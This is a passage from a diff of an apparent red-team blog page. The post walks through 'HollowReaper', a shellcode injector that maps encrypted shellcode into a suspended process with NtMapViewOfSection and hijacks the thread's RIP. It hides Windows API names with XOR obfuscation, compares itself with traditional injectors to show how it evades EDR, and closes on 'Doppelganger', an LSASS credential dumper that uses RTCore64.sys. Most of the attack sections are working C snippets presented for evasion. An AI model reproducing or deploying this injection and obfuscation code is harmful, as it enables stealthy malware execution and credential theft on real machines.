+</span></span><span class="line"><span class="cl"><span class="n">SIZE_T</span> <span class="n">viewSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pNMVOS</span><span class="p">(</span><span class="n">hSection</span><span class="p">,</span> <span class="nf">pGCP</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">localBase</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">viewSize</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span> <span class="c1">// NtMapViewOfSection
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Writing Shellcode
+</span></span></span><span class="line"><span class="cl"><span class="nf">memcpy</span><span class="p">(</span><span class="n">localBase</span><span class="p">,</span> <span class="n">shellcode_enc</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Remote mapping (for execution)
+</span></span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="n">remoteBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">viewSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pNMVOS</span><span class="p">(</span><span class="n">hSection</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">remoteBase</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">viewSize</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span> <span class="c1">// NtMapViewOfSection
 </span></span></span></code></pre></div><p>Unlike writing memory with <code>WriteProcessMemory</code>, this technique <strong>doesn&rsquo;t touch the PEB</strong>, and it avoids setting suspicious memory protections via <code>VirtualProtectEx</code>.</p>
 <hr>
 <h3 id="5-modify-thread-context-rip--shellcode">5. Modify Thread Context (RIP → shellcode)</h3>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONTEXT ctx;
-</span></span><span style="display:flex;"><span>ctx.ContextFlags <span style="color:#91d7e3;font-weight:bold">=</span> CONTEXT_CONTROL;
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">pGTC</span>(pi.hThread, <span style="color:#91d7e3;font-weight:bold">&amp;</span>ctx); <span style="color:#6e738d;font-style:italic">// GetThreadContext
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">#ifdef _WIN64
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>ctx.Rip <span style="color:#91d7e3;font-weight:bold">=</span> (DWORD64)remoteBase;
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">#else
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>ctx.Eip <span style="color:#91d7e3;font-weight:bold">=</span> (DWORD)remoteBase;
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">#endif
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// SetThreadContext
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">pSTC</span>(pi.hThread, <span style="color:#91d7e3;font-weight:bold">&amp;</span>ctx);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_CONTROL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pGTC</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span> <span class="c1">// GetThreadContext
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef _WIN64
+</span></span></span><span class="line"><span class="cl"><span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">remoteBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#else
+</span></span></span><span class="line"><span class="cl"><span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">remoteBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// SetThreadContext
+</span></span></span><span class="line"><span class="cl"><span class="nf">pSTC</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
 </span></span></code></pre></div><p>This is cleaner and stealthier than <code>CreateRemoteThread</code> or APC injection. You&rsquo;re just <strong>changing where the thread resumes</strong>.</p>
 <hr>
 <h3 id="6-resume-and-execute">6. Resume and Execute</h3>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// ResumeThread
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>DWORD suspendCount <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pRT</span>(pi.hThread);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">printf</span>(<span style="color:#a6da95">&#34;[+] Shellcode executing. Suspend count: %lu</span><span style="color:#8aadf4">\n</span><span style="color:#a6da95">&#34;</span>, suspendCount);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// ResumeThread
+</span></span></span><span class="line"><span class="cl"><span class="n">DWORD</span> <span class="n">suspendCount</span> <span class="o">=</span> <span class="nf">pRT</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Shellcode executing. Suspend count: %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">suspendCount</span><span class="p">);</span>
 </span></span></code></pre></div><p>The shellcode now runs inside a legitimate process, with no suspicious memory allocation, no DLL mappings, and no PE footprint.</p>
 <hr>
 <h3 id="why-its-more-stealthy">Why It’s More Stealthy</h3>
 <table>
-<thead>
-<tr>
-<th>Traditional Injectors</th>
-<th>HollowReaper</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Writes to remote memory via <code>WriteProcessMemory</code></td>
-<td>Uses <code>NtMapViewOfSection</code></td>
-</tr>
-<tr>
-<td>Calls <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code></td>
-<td>No <code>VirtualAllocEx</code>, no new threads</td>
-</tr>
-<tr>
-<td>Leaves PE metadata in memory</td>
-<td>Pure shellcode</td>
-</tr>
-<tr>
-<td>Touches or walks PEB</td>
-<td>Doesn’t interact with PEB at all</td>
-</tr>
-<tr>
-<td>Often leaves IAT or suspicious regions</td>
-<td>Uses mapped memory and no imports</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Traditional Injectors</th>
+          <th>HollowReaper</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Writes to remote memory via <code>WriteProcessMemory</code></td>
+          <td>Uses <code>NtMapViewOfSection</code></td>
+      </tr>
+      <tr>
+          <td>Calls <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code></td>
+          <td>No <code>VirtualAllocEx</code>, no new threads</td>
+      </tr>
+      <tr>
+          <td>Leaves PE metadata in memory</td>
+          <td>Pure shellcode</td>
+      </tr>
+      <tr>
+          <td>Touches or walks PEB</td>
+          <td>Doesn’t interact with PEB at all</td>
+      </tr>
+      <tr>
+          <td>Often leaves IAT or suspicious regions</td>
+          <td>Uses mapped memory and no imports</td>
+      </tr>
+  </tbody>
 </table>
 <hr>
 <h3 id="api-obfuscation">API Obfuscation</h3>
 <p>All critical APIs are resolved <strong>dynamically using XOR-encrypted names</strong>, decrypted at runtime and resolved via <code>CustomGetProcAddress()</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> str <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">xor_decrypt_string</span>(enc, len, XOR_KEY, key_len);
-</span></span><span style="display:flex;"><span><span style="color:#ed8796">void</span><span style="color:#91d7e3;font-weight:bold">*</span> fn <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">CustomGetProcAddress</span>(hDLL, str);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="n">str</span> <span class="o">=</span> <span class="nf">xor_decrypt_string</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">fn</span> <span class="o">=</span> <span class="nf">CustomGetProcAddress</span><span class="p">(</span><span class="n">hDLL</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
 </span></span></code></pre></div><p>Example of encrypted name for <code>CreateProcessW</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c6a0f6">static</span> <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span> CPW_ENC[] <span style="color:#91d7e3;font-weight:bold">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#f5a97f">0x73</span>, <span style="color:#f5a97f">0x43</span>, <span style="color:#f5a97f">0x57</span>, <span style="color:#f5a97f">0x52</span>, <span style="color:#f5a97f">0x40</span>, <span style="color:#f5a97f">0x50</span>, <span style="color:#f5a97f">0x66</span>, <span style="color:#f5a97f">0x45</span>, <span style="color:#f5a97f">0x57</span>, <span style="color:#f5a97f">0x5A</span>, <span style="color:#f5a97f">0x04</span>, <span style="color:#f5a97f">0x11</span>, <span style="color:#f5a97f">0x10</span>, <span style="color:#f5a97f">0x33</span>
-</span></span><span style="display:flex;"><span>};
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">CPW_ENC</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x33</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
 </span></span></code></pre></div><p>This ensures <strong>zero static references</strong> to Windows APIs.</p>
 <hr>
 <h3 id="summary">Summary</h3>
@@ -863,38 +854,38 @@ A well-tuned EDR with behavioral heuristics and kernel monitoring <strong>may st
 <hr>
 <h2 id="tldr">TL;DR</h2>
 <table>
-<thead>
-<tr>
-<th>Limitation</th>
-<th>Impact</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Credential Guard active</td>
-<td>Partial/no credential extraction</td>
-</tr>
-<tr>
-<td>Requires RTCore64.sys</td>
-<td>Needs driver load capability</td>
-</tr>
-<tr>
-<td>SYSTEM privileges needed</td>
-<td>Can’t run as low-priv user</td>
-</tr>
-<tr>
-<td>OS-specific offsets</td>
-<td>May need updates for new builds</td>
-</tr>
-<tr>
-<td>Dump written to disk</td>
-<td>Leaves artifact (unless modified)</td>
-</tr>
-<tr>
-<td>Not bulletproof</td>
-<td>May still be caught by advanced EDRs</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Limitation</th>
+          <th>Impact</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Credential Guard active</td>
+          <td>Partial/no credential extraction</td>
+      </tr>
+      <tr>
+          <td>Requires RTCore64.sys</td>
+          <td>Needs driver load capability</td>
+      </tr>
+      <tr>
+          <td>SYSTEM privileges needed</td>
+          <td>Can’t run as low-priv user</td>
+      </tr>
+      <tr>
+          <td>OS-specific offsets</td>
+          <td>May need updates for new builds</td>
+      </tr>
+      <tr>
+          <td>Dump written to disk</td>
+          <td>Leaves artifact (unless modified)</td>
+      </tr>
+      <tr>
+          <td>Not bulletproof</td>
+          <td>May still be caught by advanced EDRs</td>
+      </tr>
+  </tbody>
 </table>
 <h2 id="conclusion-1">Conclusion</h2>
 <p><strong>Doppelganger</strong> is a modern, stealthy, and modular utility designed to dump LSASS in 2025—when traditional techniques are blocked by PPL, VBS, Credential Guard, and aggressive EDRs.</p>
@@ -929,41 +920,108 @@ A well-tuned EDR with behavioral heuristics and kernel monitoring <strong>may st
 <li><a href="https://shorsec.io/blog/its-all-in-the-details-the-curious-case-of-an-lsass-dumper-gone-undetected/">https://shorsec.io/blog/its-all-in-the-details-the-curious-case-of-an-lsass-dumper-gone-undetected/</a></li>
 </ul>
 
-      </article>
+    </div>
+
+    
+    
+    <hr class="section-divider">
+    <div class="post-meta" style="flex-wrap:wrap; gap:0.5rem">
+      <span style="color:var(--subtext0); font-size:0.85rem">Tag:</span>
       
-  <div class="tags pb-4 pt-2">
+      <a href="/tags/red-teaming" class="post-tag">red teaming</a>
+      
+      <a href="/tags/windows-security" class="post-tag">windows security</a>
+      
+      <a href="/tags/detection-bypass" class="post-tag">Detection bypass</a>
+      
+      <a href="/tags/rtcore64" class="post-tag">RTCore64</a>
+      
+      <a href="/tags/lsass" class="post-tag">LSASS</a>
+      
+    </div>
     
+
     
-        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/red-teaming/">Red Teaming</a>
-        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/windows-security/">Windows Security</a>
-        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/detection-bypass/">Detection Bypass</a>
-        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/rtcore64/">RTCore64</a>
-        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/lsass/">LSASS</a>
-  </div>
+    <hr class="section-divider">
+    <nav style="display:flex; justify-content:space-between; gap:1rem; flex-wrap:wrap">
+      
+      
+      <a href="http://localhost:1313/posts/obolos/" class="btn btn-outline" style="margin-left:auto; max-width:45%; text-align:right">
+        Obolos: Building a Polymorphic Syscall … →
+      </a>
+      
+    </nav>
 
-      <div class="row">
-    <div class="col-md">
-        
-    </div>
-    <div class="col-md text-md-end">
-        
-    </div>
-</div>
-    </div>
   </div>
-  <footer>
-    <div class="container mt-4 pb-1">
-    <p class="small opacity-75">
-        
-        
-    </p>
-</div>
-
-  </footer>
+</article>
 
   </main>
 
+  <footer class="site-footer" role="contentinfo">
+  <div class="container--wide">
+    <div class="footer-inner">
+
+      <div class="footer-brand">
+        <a href="/" class="site-logo">
+          <span class="logo-icon" aria-hidden="true">🧙‍♂️</span>
+          <span>vari.sh</span>
+        </a>
+        <p class="footer-tagline">
+          Ethical hacker, security researcher, and digital sorcerer. Welcome to my grimoire.
+        </p>
+      </div>
+
+      <div>
+        <p class="footer-heading">Navigation</p>
+        <ul class="footer-links">
+          <li><a href="/">Home</a></li>
+          <li><a href="/posts/">Posts</a></li>
+          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/#about">About</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <p class="footer-heading">Link</p>
+        <ul class="footer-links">
+          
+          
+          
+          <li><a href="/index.xml">RSS Feed</a></li>
+        </ul>
+      </div>
+
+    </div>
+
+    <div class="footer-bottom">
+      <span>
+        © 2026 vari.sh ·
+        Powered by <a href="https://gohugo.io" target="_blank" rel="noopener" style="color:var(--accent)">Hugo</a> ·
+        Theme <a href="https://catppuccin.com" target="_blank" rel="noopener" style="color:var(--accent)">Catppuccin</a>
+      </span>
+      <div class="footer-palette" aria-hidden="true" title="Catppuccin palette">
+        <span class="palette-dot" style="background:var(--rosewater)"></span>
+        <span class="palette-dot" style="background:var(--flamingo)"></span>
+        <span class="palette-dot" style="background:var(--pink)"></span>
+        <span class="palette-dot" style="background:var(--mauve)"></span>
+        <span class="palette-dot" style="background:var(--red)"></span>
+        <span class="palette-dot" style="background:var(--peach)"></span>
+        <span class="palette-dot" style="background:var(--yellow)"></span>
+        <span class="palette-dot" style="background:var(--green)"></span>
+        <span class="palette-dot" style="background:var(--teal)"></span>
+        <span class="palette-dot" style="background:var(--blue)"></span>
+        <span class="palette-dot" style="background:var(--lavender)"></span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  <button class="back-to-top" id="back-to-top" aria-label="Torna su">↑</button>
+
+  <script src="/js/main.js" defer></script>
   
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+
+  
 </body>
 </html>
